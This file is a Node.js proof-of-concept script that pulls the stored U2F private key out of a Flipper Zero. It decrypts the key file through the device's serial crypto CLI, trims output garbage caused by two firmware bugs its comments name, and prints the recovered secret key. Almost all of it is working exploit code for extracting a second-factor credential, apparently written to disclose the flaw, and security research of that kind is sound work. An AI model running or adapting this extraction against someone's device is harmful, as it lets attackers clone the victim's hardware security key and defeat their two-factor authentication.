#!/usr/bin/env node

import { readFileSync } from "fs";
import { parseFlipperFile } from "./utils.mjs";
import decrypt from "./decrypt.mjs";

const device = process.argv[2];
const keyfilePath = process.argv[3];

if (typeof device === "undefined" || typeof keyfilePath === "undefined") {
  throw new Error("Usage: poc.mjs <path to serial port> <key.u2f>");
}

const key = parseFlipperFile(readFileSync(keyfilePath, "utf-8"));

if (key.get("Filetype") !== "Flipper U2F Device Key File") {
  throw new Error("Incorrect .u2f files provided");
}

if (!device || device.length === 0) {
  throw new Error("No serial port provided");
}

let keyContent = await decrypt(
  device,
  key.get("IV").replace(/\s/g, ""),
  key.get("Data").replace(/\s/g, "")
);

if (keyContent.length < 96) {
  throw new Error(
    `Invalid extracted key length shorted than expected ${keyContent.length} vs 96 expected`
  );
}

// Due to a bug with printf in crypto_cli.c:crypto_cli_decrypt() (w/ suppresed but correct PVS warning, sweet)
// decrypted payload usually contains garbage after 48 bytes.
keyContent = keyContent.substring(0, 96);

// Due to an another bug (or some kind of weird padding?) in u2f_data.c:u2f_data_key_generate,
// the last encrypted block contains garbage from the stack.
keyContent = keyContent.substring(0, keyContent.length - 32);

console.log("🔑 U2F key revealed:", keyContent);
